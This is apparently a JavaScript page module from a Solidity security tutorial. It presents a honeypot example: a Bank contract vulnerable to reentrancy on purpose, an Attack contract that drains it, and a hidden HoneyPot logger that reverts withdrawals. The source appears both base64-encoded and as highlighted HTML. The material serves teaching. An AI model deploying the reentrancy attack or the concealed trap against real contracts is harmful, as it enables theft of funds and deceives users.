// metadata
export const version = "0.8.26"
export const title = "Honeypot"
export const description = "An example of honeypot in Solidity"
export const cyfrinLink = "https://solidity-by-example.org/hacks/honeypot/"

export const keywords = ["hack", "security", "honeypot"]

export const codes = [
  {
    fileName: "HoneyPot.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCkJhbmsgaXMgYSBjb250cmFjdCB0aGF0IGNhbGxzIExvZ2dlciB0byBsb2cgZXZlbnRzLgpCYW5rLndpdGhkcmF3KCkgaXMgdnVsbmVyYWJsZSB0byB0aGUgcmVlbnRyYW5jeSBhdHRhY2suClNvIGEgaGFja2VyIHRyaWVzIHRvIGRyYWluIEV0aGVyIGZyb20gQmFuay4KQnV0IGFjdHVhbGx5IHRoZSByZWVudHJhbmN5IGV4cGxvaXQgaXMgYSBiYWl0IGZvciBoYWNrZXJzLgpCeSBkZXBsb3lpbmcgQmFuayB3aXRoIEhvbmV5UG90IGluIHBsYWNlIG9mIHRoZSBMb2dnZXIsIHRoaXMgY29udHJhY3QgYmVjb21lcwphIHRyYXAgZm9yIGhhY2tlcnMuIExldCdzIHNlZSBob3cuCgoxLiBBbGljZSBkZXBsb3lzIEhvbmV5UG90CjIuIEFsaWNlIGRlcGxveXMgQmFuayB3aXRoIHRoZSBhZGRyZXNzIG9mIEhvbmV5UG90CjMuIEFsaWNlIGRlcG9zaXRzIDEgRXRoZXIgaW50byBCYW5rLgo0LiBFdmUgZGlzY292ZXJzIHRoZSByZWVudHJhbmN5IGV4cGxvaXQgaW4gQmFuay53aXRoZHJhdyBhbmQgZGVjaWRlcyB0byBoYWNrIGl0Lgo1LiBFdmUgZGVwbG95cyBBdHRhY2sgd2l0aCB0aGUgYWRkcmVzcyBvZiBCYW5rCjYuIEV2ZSBjYWxscyBBdHRhY2suYXR0YWNrKCkgd2l0aCAxIEV0aGVyIGJ1dCB0aGUgdHJhbnNhY3Rpb24gZmFpbHMuCgpXaGF0IGhhcHBlbmVkPwpFdmUgY2FsbHMgQXR0YWNrLmF0dGFjaygpIGFuZCBpdCBzdGFydHMgd2l0aGRyYXdpbmcgRXRoZXIgZnJvbSBCYW5rLgpXaGVuIHRoZSBsYXN0IEJhbmsud2l0aGRyYXcoKSBpcyBhYm91dCB0byBjb21wbGV0ZSwgaXQgY2FsbHMgbG9nZ2VyLmxvZygpLgpMb2dnZXIubG9nKCkgY2FsbHMgSG9uZXlQb3QubG9nKCkgYW5kIHJldmVydHMuIFRyYW5zYWN0aW9uIGZhaWxzLgoqLwoKY29udHJhY3QgQmFuayB7CiAgICBtYXBwaW5nKGFkZHJlc3MgPT4gdWludDI1NikgcHVibGljIGJhbGFuY2VzOwogICAgTG9nZ2VyIGxvZ2dlcjsKCiAgICBjb25zdHJ1Y3RvcihMb2dnZXIgX2xvZ2dlcikgewogICAgICAgIGxvZ2dlciA9IExvZ2dlcihfbG9nZ2VyKTsKICAgIH0KCiAgICBmdW5jdGlvbiBkZXBvc2l0KCkgcHVibGljIHBheWFibGUgewogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdICs9IG1zZy52YWx1ZTsKICAgICAgICBsb2dnZXIubG9nKG1zZy5zZW5kZXIsIG1zZy52YWx1ZSwgIkRlcG9zaXQiKTsKICAgIH0KCiAgICBmdW5jdGlvbiB3aXRoZHJhdyh1aW50MjU2IF9hbW91bnQpIHB1YmxpYyB7CiAgICAgICAgcmVxdWlyZShfYW1vdW50IDw9IGJhbGFuY2VzW21zZy5zZW5kZXJdLCAiSW5zdWZmaWNpZW50IGZ1bmRzIik7CgogICAgICAgIChib29sIHNlbnQsKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogX2Ftb3VudH0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdIC09IF9hbW91bnQ7CgogICAgICAgIGxvZ2dlci5sb2cobXNnLnNlbmRlciwgX2Ftb3VudCwgIldpdGhkcmF3Iik7CiAgICB9Cn0KCmNvbnRyYWN0IExvZ2dlciB7CiAgICBldmVudCBMb2coYWRkcmVzcyBjYWxsZXIsIHVpbnQyNTYgYW1vdW50LCBzdHJpbmcgYWN0aW9uKTsKCiAgICBmdW5jdGlvbiBsb2coYWRkcmVzcyBfY2FsbGVyLCB1aW50MjU2IF9hbW91bnQsIHN0cmluZyBtZW1vcnkgX2FjdGlvbikKICAgICAgICBwdWJsaWMKICAgIHsKICAgICAgICBlbWl0IExvZyhfY2FsbGVyLCBfYW1vdW50LCBfYWN0aW9uKTsKICAgIH0KfQoKLy8gSGFja2VyIHRyaWVzIHRvIGRyYWluIHRoZSBFdGhlcnMgc3RvcmVkIGluIEJhbmsgYnkgcmVlbnRyYW5jeS4KY29udHJhY3QgQXR0YWNrIHsKICAgIEJhbmsgYmFuazsKCiAgICBjb25zdHJ1Y3RvcihCYW5rIF9iYW5rKSB7CiAgICAgICAgYmFuayA9IEJhbmsoX2JhbmspOwogICAgfQoKICAgIGZhbGxiYWNrKCkgZXh0ZXJuYWwgcGF5YWJsZSB7CiAgICAgICAgaWYgKGFkZHJlc3MoYmFuaykuYmFsYW5jZSA+PSAxIGV0aGVyKSB7CiAgICAgICAgICAgIGJhbmsud2l0aGRyYXcoMSBldGhlcik7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBiYW5rLmRlcG9zaXR7dmFsdWU6IDEgZXRoZXJ9KCk7CiAgICAgICAgYmFuay53aXRoZHJhdygxIGV0aGVyKTsKICAgIH0KCiAgICBmdW5jdGlvbiBnZXRCYWxhbmNlKCkgcHVibGljIHZpZXcgcmV0dXJucyAodWludDI1NikgewogICAgICAgIHJldHVybiBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICB9Cn0KCi8vIExldCdzIHNheSB0aGlzIGNvZGUgaXMgaW4gYSBzZXBhcmF0ZSBmaWxlIHNvIHRoYXQgb3RoZXJzIGNhbm5vdCByZWFkIGl0Lgpjb250cmFjdCBIb25leVBvdCB7CiAgICBmdW5jdGlvbiBsb2coYWRkcmVzcyBfY2FsbGVyLCB1aW50MjU2IF9hbW91bnQsIHN0cmluZyBtZW1vcnkgX2FjdGlvbikKICAgICAgICBwdWJsaWMKICAgIHsKICAgICAgICBpZiAoZXF1YWwoX2FjdGlvbiwgIldpdGhkcmF3IikpIHsKICAgICAgICAgICAgcmV2ZXJ0KCJJdCdzIGEgdHJhcCIpOwogICAgICAgIH0KICAgIH0KCiAgICAvLyBGdW5jdGlvbiB0byBjb21wYXJlIHN0cmluZ3MgdXNpbmcga2VjY2FrMjU2CiAgICBmdW5jdGlvbiBlcXVhbChzdHJpbmcgbWVtb3J5IF9hLCBzdHJpbmcgbWVtb3J5IF9iKQogICAgICAgIHB1YmxpYwogICAgICAgIHB1cmUKICAgICAgICByZXR1cm5zIChib29sKQogICAgewogICAgICAgIHJldHVybiBrZWNjYWsyNTYoYWJpLmVuY29kZShfYSkpID09IGtlY2NhazI1NihhYmkuZW5jb2RlKF9iKSk7CiAgICB9Cn0K",
  },
]

const html = `<p>A honeypot is a trap to catch hackers.</p>
<h3>Vulnerability</h3>
<p>Combining two exploits, reentrancy and hiding malicious code, we can build a contract</p>
<p>that will catch malicious users.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">/*
Bank is a contract that calls Logger to log events.
Bank.withdraw() is vulnerable to the reentrancy attack.
So a hacker tries to drain Ether from Bank.
But actually the reentrancy exploit is a bait for hackers.
By deploying Bank with HoneyPot in place of the Logger, this contract becomes
a trap for hackers. Let&#x27;s see how.

1. Alice deploys HoneyPot
2. Alice deploys Bank with the address of HoneyPot
3. Alice deposits 1 Ether into Bank.
4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
5. Eve deploys Attack with the address of Bank
6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

What happened?
Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
When the last Bank.withdraw() is about to complete, it calls logger.log().
Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Bank</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balances;
    Logger logger;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Logger _logger</span>) </span>{
        logger <span class="hljs-operator">=</span> Logger(_logger);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>, <span class="hljs-string">"Deposit"</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(_amount <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Insufficient funds"</span>);

        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: _amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);

        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> _amount;

        logger.log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, _amount, <span class="hljs-string">"Withdraw"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Logger</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> caller, <span class="hljs-keyword">uint256</span> amount, <span class="hljs-keyword">string</span> action</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint256</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
    </span>{
        <span class="hljs-keyword">emit</span> Log(_caller, _amount, _action);
    }
}

<span class="hljs-comment">// Hacker tries to drain the Ethers stored in Bank by reentrancy.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    Bank bank;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Bank _bank</span>) </span>{
        bank <span class="hljs-operator">=</span> Bank(_bank);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">address</span>(bank).<span class="hljs-built_in">balance</span> <span class="hljs-operator">&gt;</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>) {
            bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        bank.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>}();
        bank.withdraw(<span class="hljs-number">1</span> <span class="hljs-literal">ether</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint256</span></span>) </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
    }
}

<span class="hljs-comment">// Let&#x27;s say this code is in a separate file so that others cannot read it.</span>
<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HoneyPot</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _caller, <span class="hljs-keyword">uint256</span> _amount, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _action</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
    </span>{
        <span class="hljs-keyword">if</span> (equal(_action, <span class="hljs-string">"Withdraw"</span>)) {
            <span class="hljs-keyword">revert</span>(<span class="hljs-string">"It&#x27;s a trap"</span>);
        }
    }

    <span class="hljs-comment">// Function to compare strings using keccak256</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">equal</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _a, <span class="hljs-keyword">string</span> <span class="hljs-keyword">memory</span> _b</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">pure</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_a)) <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-built_in">keccak256</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encode</span>(_b));
    }
}
</code></pre>`

export default html
